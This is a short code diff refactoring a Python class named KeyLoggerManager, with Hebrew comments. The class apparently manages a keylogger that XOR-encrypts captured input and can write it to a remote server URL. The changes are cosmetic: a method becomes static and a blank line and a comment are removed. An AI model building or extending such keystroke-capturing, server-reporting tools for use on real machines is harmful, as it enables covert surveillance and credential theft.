@@ -6,7 +6,6 @@ from get_mac_address import get_mac_address
 from time import sleep
 
 
-
 class KeyLoggerManager:
     """ניהול התוכנה בעזרת קבצי העזר"""
 
@@ -19,7 +18,8 @@ class KeyLoggerManager:
         self.encryptor = XorEncryptor()
         self.writers = self._get_writers(write_to, url)
 
-    def _get_writers(self, write_to: list[str], url: str):
+    @staticmethod
+    def _get_writers(write_to: list[str], url: str):
         """מחזיר רשימה של מחלקות כותבות בהתאם לבחירת המשתמש"""
         writers = []
         if "server" in write_to:
@@ -51,5 +51,3 @@ class KeyLoggerManager:
         """עצירת המעקב"""
         self.running = False
         self.logger.stop_logging()
-
-# הושלם
